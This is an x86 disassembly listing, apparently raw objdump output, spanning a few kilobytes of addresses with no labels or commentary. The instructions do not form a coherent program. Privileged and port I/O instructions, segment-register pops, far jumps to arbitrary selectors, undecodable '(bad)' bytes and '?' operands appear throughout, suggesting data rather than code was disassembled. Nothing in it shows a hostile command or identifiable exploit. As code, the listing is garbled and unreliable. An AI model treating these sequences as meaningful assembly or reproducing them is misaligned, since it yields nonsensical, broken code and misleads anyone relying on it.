  48f781:	in     al,0x49
  48f783:	mov    BYTE PTR [edx+0x7f],0x3e
  48f787:	sbb    BYTE PTR ss:[edi-0x45087bdf],dl
  48f78e:	push   es
  48f78f:	or     DWORD PTR [edi+0x3f],ecx
  48f792:	xchg   DWORD PTR [ebp-0x7a],eax
  48f795:	sub    eax,0x3cf9051
  48f79a:	lar    ecx,WORD PTR [ecx-0x38]
  48f79e:	mov    al,0x9b
  48f7a0:	lahf   
  48f7a1:	mov    dh,0x5
  48f7a3:	xor    BYTE PTR [eax-0x4f1250a1],0xd2
  48f7aa:	scas   al,BYTE PTR es:[edi]
  48f7ab:	pop    ds
  48f7ac:	pop    ss
  48f7ad:	and    BYTE PTR ds:0xe9eb,dl
  48f7b2:	out    dx,eax
  48f7b3:	and    ecx,DWORD PTR [edi+0x67]
  48f7b6:	ins    BYTE PTR es:[edi],dx
  48f7b7:	stos   DWORD PTR es:[edi],eax
  48f7b8:	inc    edx
  48f7b9:	mov    edi,0x1237ffdb
  48f7be:	xor    eax,0xbdbfe7ad
  48f7c3:	jne    0x48f74e
  48f7c5:	pop    eax
  48f7c6:	sysret 
  48f7c8:	test   al,0x35
  48f7ca:	push   ebp
  48f7cb:	mov    eax,0x33573087
  48f7d0:	out    dx,eax
  48f7d1:	pop    eax
  48f7d2:	add    eax,0x6f5790f0
  48f7d7:	adc    dl,BYTE PTR [ecx+0x33b74535]
  48f7dd:	test   DWORD PTR [esi+0x57d2200d],0x896cafdf
  48f7e7:	adc    dh,0xaf
  48f7ea:	aaa    
  48f7eb:	adc    BYTE PTR [ecx+0x357f6c0a],bl
  48f7f1:	mov    ch,0x18
  48f7f3:	adc    al,0x56
  48f7f5:	out    dx,eax
  48f7f6:	inc    edi
  48f7f7:	inc    edx
  48f7f8:	dec    ebx
  48f7f9:	outs   dx,DWORD PTR ds:[esi]
  48f7fa:	mov    cl,0xf3
  48f7fc:	imul   ebp,ebx,0x4b
  48f7ff:	dec    eax
  48f800:	add    eax,0xff453e10
  48f805:	inc    ebx
  48f806:	outs   dx,DWORD PTR ds:[esi]
  48f807:	pop    ebp
  48f808:	ret    0xf1f
  48f80b:	jne    0x48f857
  48f80d:	les    ebp,FWORD PTR [ebp+0x40afcadf]
  48f813:	outs   dx,BYTE PTR ds:[esi]
  48f814:	fwait
  48f815:	sub    edi,0x60ad43a7
  48f81b:	push   ecx
  48f81c:	fcom   QWORD PTR [edx]
  48f81e:	packuswb mm2,QWORD PTR [edi+0x23]
  48f822:	mov    dh,0xb0
  48f824:	aas    
  48f825:	addr16 daa 
  48f827:	push   edx
  48f828:	mov    bl,0xb1
  48f82a:	pop    eax
  48f82b:	setg   BYTE PTR [esi-0x78dee7a6]
  48f832:	xlat   BYTE PTR ds:[ebx]
  48f833:	cmp    DWORD PTR [ebx],edi
  48f835:	imul   esp,DWORD PTR [edx+edx*2+0x22bb6f37],0x5f8f0be2
  48f840:	xor    DWORD PTR [edi-0x45],esp
  48f843:	or     ecx,0x2daf4201
  48f849:	pushf  
  48f84a:	or     DWORD PTR ss:[ebx+0x77],eax
  48f84e:	push   ss
  48f84f:	mov    ecx,DWORD PTR [ecx+0x5a]
  48f852:	repnz daa 
  48f854:	inc    ebx
  48f855:	xlat   BYTE PTR ds:[ebx]
  48f856:	lea    ecx,[edx-0x79]
  48f859:	mov    eax,ds:0x22b7af30
  48f85e:	mov    al,ds:0x27c7a9ae
  48f863:	xlat   BYTE PTR ds:[ebx]
  48f864:	pusha  
  48f865:	add    al,0xe4
  48f867:	inc    esp
  48f868:	lahf   
  48f869:	inc    esp
  48f86a:	fcom   DWORD PTR [eax-0x4830bf92]
  48f870:	in     al,0xc1
  48f872:	inc    edx
  48f873:	dec    edx
  48f874:	das    
  48f875:	xchg   edi,eax
  48f876:	xor    dl,BYTE PTR [esi]
  48f878:	xchg   ebp,eax
  48f879:	mov    cl,0xe4
  48f87b:	xor    eax,0xb6d28e7
  48f880:	loopne 0x48f84d
  48f882:	pop    ds
  48f883:	stos   DWORD PTR es:[edi],eax
  48f884:	lods   eax,DWORD PTR ds:[esi]
  48f885:	jmp    0x48f897
  48f887:	sbb    edx,DWORD PTR [edi-0x9]
  48f88a:	daa    
  48f88b:	mov    cl,0xc3
  48f88d:	mov    cl,0x16
  48f88f:	mov    ebx,0x42efd6d7
  48f894:	arpl   WORD PTR ds:0x97bf41c0,bx
  48f89a:	push   cs
  48f89b:	pusha  
  48f89c:	inc    ecx
  48f89d:	mov    al,0x97
  48f89f:	push   edi
  48f8a0:	or     al,0x60
  48f8a2:	xchg   DWORD PTR [edi+ebp*1-0x454ea588],esi
  48f8a9:	fbstp  TBYTE PTR [edi+0x70a30437]
  48f8af:	popf   
  48f8b0:	jecxz  0x48f8f7
  48f8b2:	das    
  48f8b3:	stc    
  48f8b4:	add    al,BYTE PTR [esi]
  48f8b6:	shl    DWORD PTR [ebx],1
  48f8b8:	xchg   DWORD PTR [esi+0x33],esi
  48f8bb:	sub    BYTE PTR [esi],dh
  48f8bd:	loopne 0x48f8ec
  48f8bf:	dec    ebx
  48f8c0:	iret   
  48f8c1:	pop    ss
  48f8c2:	xchg   BYTE PTR [ebp+0x1fa294ea],ch
  48f8c8:	ja     0x48f8fe
  48f8ca:	cs dec esi
  48f8cc:	inc    ebx
  48f8cd:	dec    ebx
  48f8ce:	out    0x35,eax
  48f8d0:	ret    
  48f8d1:	ficomp DWORD PTR [edx]
  48f8d3:	inc    esi
  48f8d4:	inc    esp
  48f8d5:	outs   dx,DWORD PTR ds:[esi]
  48f8d6:	inc    edi
  48f8d7:	das    
  48f8d8:	and    dh,BYTE PTR [ecx]
  48f8da:	inc    eax
  48f8db:	fild   DWORD PTR [edi-0x39]
  48f8de:	sbb    BYTE PTR [ebx+0x7],0x90
  48f8e2:	aas    
  48f8e3:	push   edi
  48f8e4:	(bad)  
  48f8e5:	(bad)  
  48f8e6:	cmc    
  48f8e7:	nop
  48f8e8:	stos   BYTE PTR es:[edi],al
  48f8e9:	out    0x27,eax
  48f8eb:	push   ebx
  48f8ec:	daa    
  48f8ed:	xor    dl,bl
  48f8ef:	sbb    dl,BYTE PTR [edi+0x3f]
  48f8f2:	(bad)  
  48f8f3:	or     al,0xeb
  48f8f5:	ficom  DWORD PTR [esi]
  48f8f7:	out    dx,eax
  48f8f8:	xlat   BYTE PTR ds:[ebx]
  48f8f9:	ja     0x48f90f
  48f8fb:	sub    al,0x58
  48f8fd:	leave  
  48f8fe:	xor    al,0x7
  48f900:	(bad)  
  48f901:	sbb    eax,0x6760c8ea
  48f906:	xlat   BYTE PTR ds:[ebx]
  48f907:	jnp    0x48f963
  48f909:	pusha  
  48f90a:	push   0x74
  48f90c:	aaa    
  48f90d:	dec    edi
  48f90e:	add    DWORD PTR [ebx+0x31a7e063],ecx
  48f914:	pop    edi
  48f915:	jo     0x48f89c
  48f917:	push   ebp
  48f918:	or     BYTE PTR [edi-0x79],al
  48f91b:	pop    edx
  48f91c:	and    edx,DWORD PTR [eax+0x7587f708]
  48f922:	and    BYTE PTR [edx-0x73],dh
  48f925:	xlat   BYTE PTR ds:[ebx]
  48f926:	xor    BYTE PTR [edi+0x45],ch
  48f929:	xchg   edi,eax
  48f92a:	outs   dx,BYTE PTR ds:[esi]
  48f92b:	mov    ebp,0x5762af7f
  48f930:	lods   al,BYTE PTR ds:[esi]
  48f931:	sub    eax,0x8ba66e26
  48f936:	inc    edi
  48f937:	and    DWORD PTR [eax-0x5d],esp
  48f93a:	dec    eax
  48f93b:	retf   
  48f93c:	push   ss
  48f93d:	adc    DWORD PTR [ecx],ebx
  48f93f:	inc    esi
  48f940:	pop    es
  48f941:	ud0    edx,DWORD PTR ds:0xc792dd61
  48f948:	aaa    
  48f949:	fwait
  48f94a:	adc    BYTE PTR [ecx+0x5c],0x39
  48f94e:	xchg   edi,esi
  48f950:	cmp    BYTE PTR [edi-0x48],ah
  48f953:	push   ecx
  48f954:	xchg   ecx,eax
  48f955:	sbb    BYTE PTR [edi],cl
  48f957:	into   
  48f958:	sub    ebx,DWORD PTR [edx+edx*1]
  48f95b:	sub    ebx,DWORD PTR [edi-0x6fffd949]
  48f961:	nop
  48f962:	xchg   ecx,eax
  48f963:	xor    DWORD PTR [eax+eax*1-0x7b],eax
  48f967:	shr    DWORD PTR [edx+0x27],0xb6
  48f96b:	xchg   ebx,eax
  48f96c:	or     ebx,DWORD PTR [esi-0x18]
  48f96f:	aaa    
  48f970:	out    dx,eax
  48f971:	aas    
  48f972:	inc    esi
  48f973:	xchg   BYTE PTR [ecx-0x3db8a59e],dh
  48f979:	and    al,dl
  48f97b:	jmp    0xa0b0:0x58523797
  48f982:	aaa    
  48f983:	pop    es
  48f984:	lds    ebx,FWORD PTR [edx-0x78]
  48f987:	push   cs
  48f988:	out    dx,eax
  48f989:	idiv   DWORD PTR [ebx+0x4e]
  48f98c:	push   cs
  48f98d:	lds    edi,FWORD PTR ss:[edi+0x34]
  48f991:	das    
  48f992:	inc    esi
  48f993:	xor    cl,BYTE PTR [eax-0x28ecfb7f]
  48f999:	lahf   
  48f99a:	push   es
  48f99b:	jo     0x48f92d
  48f99d:	ret    0x5ce7
  48f9a0:	add    ebp,ebx
  48f9a2:	adc    al,0x37
  48f9a4:	push   edi
  48f9a5:	sbb    ch,0xc2
  48f9a8:	cs das 
  48f9aa:	(bad)  
  48f9ab:	test   DWORD PTR [edx],0xf912b6b
  48f9b1:	addr16 test eax,ecx
  48f9b4:	rol    BYTE PTR [edi+eiz*4-0x59],cl
  48f9b8:	xchg   DWORD PTR ds:0xb260c6ec,eax
  48f9be:	mul    DWORD PTR [ecx]
  48f9c0:	mov    eax,0xa36fb304
  48f9c5:	ret    
  48f9c6:	jp     0x48fa1f
  48f9c8:	and    DWORD PTR [edi+0x37],ebp
  48f9cb:	imul   ebp,ebx,0x4
  48f9ce:	pusha  
  48f9cf:	scas   al,BYTE PTR es:[edi]
  48f9d0:	mov    DWORD PTR [ebx-0x79],0x414a0c48
  48f9d7:	call   DWORD PTR [esi+0x3]
  48f9da:	xor    eax,0x762fa7b8
  48f9df:	inc    edx
  48f9e0:	cmp    bl,al
  48f9e2:	xchg   edi,eax
  48f9e3:	xor    DWORD PTR [ebx],esi
  48f9e5:	bound  edx,QWORD PTR [edi]
  48f9e7:	rol    BYTE PTR [ebp+0x2c3f57df],0x4c
  48f9ee:	push   es
  48f9ef:	push   ss
  48f9f0:	das    
  48f9f1:	xor    al,0xdd
  48f9f3:	fidiv  DWORD PTR [eax+0x4f2fefb8]
  48f9f9:	add    DWORD PTR [ebx-0x48c05173],ebp
  48f9ff:	or     eax,edx
  48fa01:	push   esp
  48fa02:	pusha  
  48fa03:	fild   WORD PTR [ebp+0x70]
  48fa06:	sbb    DWORD PTR [esi-0x4c],esi
  48fa09:	sub    edx,edi
  48fa0b:	out    dx,eax
  48fa0c:	aaa    
  48fa0d:	fnstsw WORD PTR ss:[ebx]
  48fa10:	ret    0x1f55
  48fa13:	inc    ecx
  48fa14:	jmp    0x48fa55
  48fa16:	jle    0x48f9fa
  48fa18:	imul   eax,edi,0xaf72afe1
  48fa1e:	push   edi
  48fa1f:	loopne 0x48f9f3
  48fa21:	test   al,0x35
  48fa23:	(bad)  
  48fa24:	aaa    
  48fa25:	dec    edi
  48fa26:	mov    WORD PTR [ecx-0x79],cs
  48fa29:	push   esi
  48fa2a:	idiv   DWORD PTR [esi]
  48fa2c:	xor    BYTE PTR [esi],bh
  48fa2e:	push   esi
  48fa2f:	ret    
  48fa30:	fstp   TBYTE PTR [edi]
  48fa32:	inc    edi
  48fa33:	outs   dx,DWORD PTR ds:[esi]
  48fa34:	sub    eax,DWORD PTR [eax-0x85f2b8f]
  48fa3a:	xor    eax,DWORD PTR [ebx+0x67c44a1d]
  48fa40:	xor    ecx,DWORD PTR [edi-0x5a17d149]
  48fa46:	sub    ah,BYTE PTR [edi+0x5b]
  48fa49:	psrad  mm4,QWORD PTR [edx+0x45af1eb8]
  48fa50:	ja     0x48fac6
  48fa52:	inc    ecx
  48fa53:	mov    eax,0x4f39bf8e
  48fa58:	dec    ecx
  48fa59:	sub    eax,DWORD PTR [eax+ecx*4+0x77862107]
  48fa60:	jo     0x48fa91
  48fa62:	aaa    
  48fa63:	jg     0x48fa8c
  48fa65:	call   0x4f89efea
  48fa6a:	cmp    bh,cl
  48fa6c:	jb     0x48fa8e
  48fa6e:	push   ebx
  48fa6f:	inc    ebx
  48fa70:	jg     0x48faaa
  48fa72:	xor    DWORD PTR [eax+0x4e],eax
  48fa75:	sbb    dl,BYTE PTR [esi]
  48fa77:	inc    bx
  48fa79:	inc    ebx
  48fa7a:	adc    al,0x5c
  48fa7c:	adc    eax,0x41b71fdb
  48fa81:	mov    edi,0x6128d8c8
  48fa86:	inc    edi
  48fa87:	cmp    cl,BYTE PTR [edx-0x412874f2]
  48fa8d:	(bad)  
  48fa8e:	xor    esi,DWORD PTR [esi-0x5478f2a4]
  48fa94:	out    dx,eax
  48fa95:	cmp    BYTE PTR [edi+0x1f],ah
  48fa98:	mov    ecx,ss
  48fa9a:	pop    esi
  48fa9b:	test   edi,0x17043593
  48faa1:	sbb    BYTE PTR [edi+esi*2],bl
  48faa4:	jae    0x48fa65
  48faa6:	jnp    0x48fa53
  48faa8:	pusha  
  48faa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48faaa:	out    0x7,al
  48faac:	mov    bl,0x3f
  48faae:	lds    ecx,FWORD PTR [edx-0x588c2172]
  48fab4:	mov    esp,DWORD PTR [esi+0x42]
  48fab7:	mov    ?,esi
  48fab9:	mov    BYTE PTR [edi],dh
  48fabb:	pop    edi
  48fabc:	aaa    
  48fabd:	jge    0x48fa40
  48fabf:	cmp    al,dh
  48fac1:	iret   
  48fac2:	fcmovnb st,st(0)
  48fac4:	cs dec eax
  48fac6:	stos   DWORD PTR es:[edi],eax
  48fac7:	pop    edi
  48fac8:	(bad)  
  48facc:	test   al,0x57
  48face:	sub    DWORD PTR [esi+ebp*2],0x6a
  48fad2:	push   esp
  48fad3:	iret   
  48fad4:	scas   eax,DWORD PTR es:[edi]
  48fad5:	pop    eax
  48fad6:	xlat   BYTE PTR ds:[ebx]
  48fad7:	sub    BYTE PTR [ecx],ch
  48fad9:	xchg   DWORD PTR [ebx-0x5f],esp
  48fadc:	dec    edx
  48fadd:	loope  0x48faf8
  48fadf:	jae    0x48faf0
  48fae1:	inc    edx
  48fae2:	mov    ds:0xbf5f1589,eax
  48fae7:	es pop es
  48fae9:	aam    0xa2
  48faeb:	das    
  48faec:	xor    ebx,DWORD PTR [ebp+0x5fa69d5a]
  48faf2:	fld    TBYTE PTR [edx+ecx*1+0x5fef2f13]
  48faf9:	pop    eax
  48fafa:	ins    DWORD PTR es:[edi],dx
  48fafb:	xchg   ecx,eax
  48fafc:	popa   
  48fafd:	outs   dx,DWORD PTR ds:[esi]
  48fafe:	mov    edi,0x414a8c16
  48fb03:	das    
  48fb04:	xlat   BYTE PTR ds:[ebx]
  48fb05:	nop
  48fb06:	sbb    dh,BYTE PTR [ecx-0x3e98e1cd]
  48fb0c:	jmp    0xad3f:0x9f7bb192
  48fb13:	add    bh,BYTE PTR [ebx]
  48fb15:	push   edx
  48fb16:	add    edi,edi
  48fb18:	rol    bl,cl
  48fb1a:	mov    edx,0xa32baf45
  48fb1f:	push   cs
  48fb20:	cmp    eax,0xffffffff
  48fb23:	mov    bh,0x20
  48fb25:	pop    esp
  48fb26:	sub    DWORD PTR [edi+ecx*4+0x7],esp
  48fb2a:	inc    ecx
  48fb2b:	add    ecx,eax
  48fb2d:	inc    eax
  48fb2e:	add    eax,0xa84737af
  48fb33:	add    eax,0x54fa937
  48fb38:	xchg   BYTE PTR [esi],dl
  48fb3a:	xchg   edi,eax
  48fb3b:	ja     0x48fb54
  48fb3d:	inc    eax
  48fb3e:	mov    ebx,DWORD PTR [edx+0x3140c758]
  48fb44:	mov    cl,0x55
  48fb46:	mov    edi,0xb16735f7
  48fb4b:	(bad)  
  48fb4c:	or     BYTE PTR [eax+0x5f],ah
  48fb4f:	dec    edi
  48fb50:	push   ebp
  48fb51:	or     DWORD PTR [ebx-0x2d10b8a0],ebp
  48fb57:	test   al,0xda
  48fb59:	test   eax,0x4abb0777
  48fb5e:	push   ebp
  48fb5f:	dec    edi
  48fb60:	shl    DWORD PTR [edi],cl
  48fb62:	addr16 daa 
  48fb64:	mov    eax,ds:0x4758d016
  48fb69:	mov    bh,0x42
  48fb6b:	pop    ebx
  48fb6c:	and    eax,0xa3472761
  48fb71:	sbb    BYTE PTR [eax+0x20],bh
  48fb74:	aas    
  48fb75:	lahf   
  48fb76:	push   es
  48fb77:	sbb    al,0xe2
  48fb79:	push   eax
  48fb7a:	xchg   edi,eax
  48fb7b:	push   ebx
  48fb7c:	pop    edi
  48fb7d:	sbb    eax,0x1aad3bd0
  48fb82:	pop    ds
  48fb83:	pop    es
  48fb84:	ja     0x48fb36
  48fb86:	adc    ebp,DWORD PTR [edi+0x17]
  48fb89:	xchg   edi,eax
  48fb8a:	out    dx,eax
  48fb8b:	xor    ch,BYTE PTR [ebx]
  48fb8d:	mov    al,ds:0x270b4bef
  48fb92:	xor    eax,0x3a45d50b
  48fb97:	push   edx
  48fb98:	inc    DWORD PTR [esi-0x3e]
  48fb9b:	jg     0x48fba5
  48fb9d:	dec    ebp
  48fb9e:	add    ch,BYTE PTR [esi+0x26]
  48fba1:	(bad)  
  48fba2:	out    dx,eax
  48fba3:	sbb    ch,BYTE PTR [ebp+edx*2+0x53422f77]
  48fbaa:	stos   BYTE PTR es:[edi],al
  48fbab:	test   eax,0xdb036c0b
  48fbb0:	pop    edi
  48fbb1:	push   es
  48fbb2:	mov    cl,0xb1
  48fbb4:	fcom   DWORD PTR [edi+0x77]
  48fbb7:	adc    eax,DWORD PTR [ebx]
  48fbb9:	pop    es
  48fbba:	and    DWORD PTR [edi-0x7cca18ce],ecx
  48fbc0:	dec    edx
  48fbc1:	mov    eax,ds:0x88f70701
  48fbc6:	inc    ebp
  48fbc7:	or     BYTE PTR [ebx],cl
  48fbc9:	pop    edi
  48fbca:	pop    edx
  48fbcb:	push   edi
  48fbcc:	sub    eax,DWORD PTR [esi+0x55ba0bcf]
  48fbd2:	add    esp,DWORD PTR [ecx-0x7abd2039]
  48fbd8:	pusha  
  48fbd9:	or     al,0x95
  48fbdb:	xlat   BYTE PTR ds:[ebx]
  48fbdc:	ss pop ebx
  48fbde:	xor    al,0xb1
  48fbe0:	ret    0x7758
  48fbe3:	xor    BYTE PTR [edx],ah
  48fbe5:	mov    ebp,0xe7bf675d
  48fbea:	jbe    0x48fbcc
  48fbec:	loopne 0x48fc0e
  48fbee:	(bad)  
  48fbef:	xor    bl,BYTE PTR [edi+0x46]
  48fbf2:	or     ch,BYTE PTR [ebp+0x14]
  48fbf5:	add    edi,edi
  48fbf7:	pop    ds
  48fbf8:	stos   DWORD PTR es:[edi],eax
  48fbf9:	adc    BYTE PTR [esi],ch
  48fbfb:	aaa    
  48fbfc:	inc    esp
  48fbfd:	dec    edi
  48fbfe:	pop    edi
  48fbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fc00:	or     BYTE PTR [ebx-0x702984f4],cl
  48fc06:	cmp    DWORD PTR [edi+0x5b],eax
  48fc09:	sub    edx,DWORD PTR [esi]
  48fc0b:	lahf   
  48fc0c:	jmp    0x48fc58
  48fc0e:	cdq    
  48fc0f:	rol    BYTE PTR [eax-0x4edda8a9],cl
  48fc15:	bound  ebp,QWORD PTR [ebp+0x75c48ff7]
  48fc1b:	dec    ebx
  48fc1c:	imul   edx,edi,0x77
  48fc1f:	cmp    DWORD PTR [eax+0x3f8b891d],ecx
  48fc25:	neg    DWORD PTR [eax-0x506fd79c]
  48fc2b:	xor    bh,BYTE PTR [ecx]
  48fc2d:	push   ebp
  48fc2e:	fdiv   DWORD PTR [esi+0x5747879d]
  48fc34:	pop    ds
  48fc35:	push   edi
  48fc36:	mov    ds:0x3af8830,al
  48fc3b:	and    eax,0x5b80badf
  48fc40:	dec    esi
  48fc41:	cmp    BYTE PTR [esi+0x40],dh
  48fc44:	mov    eax,ds:0x851b5721
  48fc49:	inc    edx
  48fc4a:	inc    ecx
  48fc4b:	cmp    eax,DWORD PTR [edi-0x57221f61]
  48fc51:	push   0x6c432e17
  48fc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48fc57:	sahf   
  48fc58:	push   esi
  48fc59:	iret   
  48fc5a:	dec    ebx
  48fc5b:	lahf   
  48fc5c:	xchg   BYTE PTR [eax],dl
  48fc5e:	xchg   DWORD PTR ds:0x92e97fc7,ebp
  48fc64:	mov    ebx,DWORD PTR [ebp+0x2]
  48fc67:	das    
  48fc68:	xor    BYTE PTR [ebp-0x3b],al
  48fc6b:	pop    eax
  48fc6c:	repnz sbb eax,0x1f46170f
  48fc72:	push   ecx
  48fc73:	xchg   ecx,eax
  48fc74:	ret    0x4f86
  48fc77:	outs   dx,DWORD PTR ds:[esi]
  48fc78:	mov    ebx,0x380c84a4
  48fc7d:	xchg   edi,eax
  48fc7e:	jmp    0x48fcb4
  48fc80:	fadd   QWORD PTR [edx+0x2f179339]
  48fc86:	les    esp,FWORD PTR [edx+0x77c76c11]
  48fc8c:	dec    DWORD PTR [ebx+0x23]
  48fc8f:	mov    DWORD PTR [ebp-0x30fdc069],ebx
  48fc95:	pop    edx
  48fc96:	mov    DWORD PTR [ebx-0x69b0d819],esp
  48fc9c:	jl     0x48fcf8
  48fc9e:	add    eax,0xdb302f97
  48fca3:	imul   eax,DWORD PTR es:0x869fb737,0x45
  48fcab:	shr    BYTE PTR [eax-0x9],0x67
  48fcaf:	(bad)  
  48fcb1:	dec    edx
  48fcb2:	mov    ds:0x166f0f5e,eax
  48fcb7:	push   ss
  48fcb8:	mov    ebx,0xf975a48
  48fcbd:	inc    ebp
  48fcbe:	jg     0x48fca2
  48fcc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fcc1:	fcomp  DWORD PTR cs:[edi]
  48fcc4:	pop    es
  48fcc5:	inc    ebx
  48fcc6:	lahf   
  48fcc7:	push   ebp
  48fcc8:	lods   al,BYTE PTR ds:[esi]
  48fcc9:	xchg   BYTE PTR [edi-0x66],al
  48fccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48fccd:	cmovno ebp,DWORD PTR [edx+eiz*1+0x60bb0769]
  48fcd5:	and    al,dl
  48fcd7:	outs   dx,DWORD PTR ds:[esi]
  48fcd8:	(bad)  
  48fcd9:	mov    ds:0x9b50f022,al
  48fcde:	xor    al,0x47
  48fce0:	sbb    eax,ebp
  48fce2:	data16 adc BYTE PTR [edi],bh
  48fce5:	xchg   edi,eax
  48fce6:	das    
  48fce7:	out    dx,al
  48fce8:	adc    BYTE PTR [ebp+0x71],0x8c
  48fcec:	das    
  48fced:	pop    ss
  48fcee:	mul    edx
  48fcf0:	arpl   WORD PTR ds:0x74e337b0,ax
  48fcf6:	sub    BYTE PTR [edi+0x69],al
  48fcf9:	mov    bh,0x37
  48fcfb:	addr16 push esp
  48fcfd:	lods   al,BYTE PTR ds:[esi]
  48fcfe:	add    ah,BYTE PTR [eax]
  48fd00:	pop    es
  48fd01:	pop    ss
  48fd02:	push   0x72
  48fd04:	adc    al,0xbd
  48fd06:	out    dx,eax
  48fd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48fd08:	ss popa 
  48fd0a:	add    eax,0x870f6ed6
  48fd0f:	mov    cl,0xbd
  48fd11:	mov    al,0x6
  48fd13:	sub    BYTE PTR [bx],0x43
  48fd17:	mov    eax,ds:0x3f57518a
  48fd1c:	mov    edx,0x9742ae8a
  48fd21:	xor    edi,esi
  48fd23:	inc    ecx
  48fd24:	lods   eax,DWORD PTR ds:[esi]
  48fd25:	pop    eax
  48fd26:	mov    ebx,0x47463f62
  48fd2b:	pop    es
  48fd2c:	rcr    BYTE PTR [edx],1
  48fd2e:	mov    esi,0x69270b40
  48fd33:	add    eax,0xefb7ec40
  48fd38:	add    BYTE PTR [eax+0x5],ch
  48fd3b:	aaa    
  48fd3c:	outs   dx,DWORD PTR ds:[esi]
  48fd3d:	ss pop es
  48fd3f:	push   esi
  48fd40:	dec    ecx
  48fd41:	mov    eax,0xaf5b27c5
  48fd46:	and    DWORD PTR [edx+ecx*8-0x5db2a8ec],ebp
  48fd4d:	mov    cl,0x8a
  48fd4f:	outs   dx,DWORD PTR ds:[esi]
  48fd50:	stos   DWORD PTR es:[edi],eax
  48fd51:	lods   eax,DWORD PTR ds:[esi]
  48fd52:	rol    eax,cl
  48fd54:	mov    dl,BYTE PTR [edi]
  48fd56:	pop    ds
  48fd57:	mov    al,0x8e
  48fd59:	push   eax
  48fd5a:	or     DWORD PTR [edi+0x6f],ebx
  48fd5d:	sbb    BYTE PTR [edi],al
  48fd5f:	adc    ah,BYTE PTR ds:0x4a18078f
  48fd65:	in     al,dx
  48fd66:	adc    bl,0x97
  48fd69:	mov    al,0x6b
  48fd6b:	adc    esi,DWORD PTR [ecx+0x737b97]
  48fd71:	inc    edx
  48fd72:	xchg   esp,eax
  48fd73:	add    al,0xd7
  48fd75:	test   DWORD PTR [eax-0x4f],edx
  48fd78:	inc    eax
  48fd79:	inc    edi
  48fd7a:	mov    bh,0xab
  48fd7c:	ret    0xa622
  48fd7f:	scas   eax,DWORD PTR es:[edi]
  48fd80:	ja     0x48fd64
  48fd82:	or     eax,0xa72f530a
  48fd87:	mov    bl,0x81
  48fd89:	push   eax
  48fd8a:	and    BYTE PTR [edi+0x26b96cb7],ah
  48fd90:	pusha  
  48fd91:	rdpmc  
  48fd93:	push   edi
  48fd94:	popa   
  48fd95:	popa   
  48fd96:	xor    DWORD PTR [esi-0x9],eax
  48fd99:	sub    esp,DWORD PTR [edx-0x54]
  48fd9c:	test   al,0x1f
  48fd9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48fd9f:	mov    bh,0xb5
  48fda1:	sub    dl,BYTE PTR [eax]
  48fda3:	scas   eax,DWORD PTR es:[edi]
  48fda4:	mov    cr0,edx
  48fda7:	and    dl,BYTE PTR [edi+0x38]
  48fdaa:	outs   dx,DWORD PTR ds:[esi]
  48fdab:	sub    ecx,edx
  48fdad:	and    cl,ch
  48fdaf:	outs   dx,DWORD PTR ss:[esi]
  48fdb1:	adc    ebx,DWORD PTR [esi+edx*8-0xbae8ab]
  48fdb8:	xor    al,0x30
  48fdba:	inc    esp
  48fdbb:	sub    DWORD PTR [eax],eax
  48fdbd:	fbstp  TBYTE PTR [edx]
  48fdbf:	pop    eax
  48fdc0:	sbb    BYTE PTR [eax],ah
  48fdc2:	test   BYTE PTR [edi+0x36],cl
  48fdc5:	js     0x48fdc9
  48fdc7:	mov    eax,ds:0xc3ce8f4a
  48fdcc:	push   0x34
  48fdce:	sbb    ecx,DWORD PTR [edi]
  48fdd0:	xchg   edi,eax
  48fdd1:	push   esi
  48fdd2:	xor    eax,0xb7a71589
  48fdd7:	aam    0x9a
  48fdd9:	cmc    
  48fdda:	(bad)  
  48fddb:	pop    edi
  48fddc:	mov    edi,0x4c9a10c7
  48fde1:	jge    0x48fdc2
  48fde3:	inc    ecx
  48fde4:	outs   dx,DWORD PTR ds:[esi]
  48fde5:	inc    eax
  48fde6:	and    DWORD PTR [ebp+edx*8+0x16ae4f9f],eax
  48fded:	mov    eax,ds:0x3b7f77a9
  48fdf2:	add    BYTE PTR [ebp-0x208870f6],dh
  48fdf8:	mov    WORD PTR ds:0xea27c482,?
  48fdfe:	add    al,0x94
  48fe00:	cmp    bh,dl
  48fe02:	(bad)  
  48fe05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48fe06:	mov    al,0x3f
  48fe08:	pop    ds
  48fe09:	mov    al,0xa2
  48fe0b:	int    0xd2
  48fe0d:	(bad)  
  48fe0e:	daa    
  48fe0f:	xor    eax,0x67031a1b
  48fe14:	out    0xe8,eax
  48fe16:	xchg   esi,eax
  48fe17:	mov    ah,0x82
  48fe19:	das    
  48fe1a:	out    dx,eax
  48fe1b:	push   0x52
  48fe1d:	stc    
  48fe1e:	inc    esi
  48fe1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fe20:	inc    ebx
  48fe21:	inc    ebp
  48fe22:	in     al,0xa0
  48fe24:	adc    dh,BYTE PTR [ecx+0xb33c71f]
  48fe2a:	mov    eax,ds:0x4eefd60b
  48fe2f:	popa   
  48fe30:	inc    esp
  48fe31:	inc    ecx
  48fe32:	out    dx,eax
  48fe33:	daa    
  48fe34:	jno    0x48fdbb
  48fe36:	push   ebp
  48fe37:	mov    cl,0x67
  48fe39:	dec    edi
  48fe3a:	shl    BYTE PTR [edx+0x58],0x87
  48fe3e:	out    dx,eax
  48fe3f:	xchg   DWORD PTR [ebp-0x28ed89f6],esi
  48fe45:	pop    ds
  48fe46:	test   BYTE PTR [ecx],dl
  48fe48:	lds    ebx,FWORD PTR [edx-0x391d68d9]
  48fe4e:	loopne 0x48fdd4
  48fe50:	das    
  48fe51:	pop    edi
  48fe52:	adc    eax,0x45ed6ae9
  48fe57:	aaa    
  48fe58:	pop    ss
  48fe59:	daa    
  48fe5a:	jno    0x48fe01
  48fe5c:	push   eax
  48fe5d:	mov    eax,ds:0xc28b53ef
  48fe62:	adc    BYTE PTR [edi+ebx*2+0x7],0xf9
  48fe67:	or     eax,0xbfbfa108
  48fe6c:	inc    ebp
  48fe6d:	push   esi
  48fe6e:	and    eax,DWORD PTR [ecx+0x2c]
  48fe71:	xchg   DWORD PTR [ebx],eax
  48fe73:	inc    eax
  48fe74:	mov    WORD PTR [edx-0x6d1fb859],gs
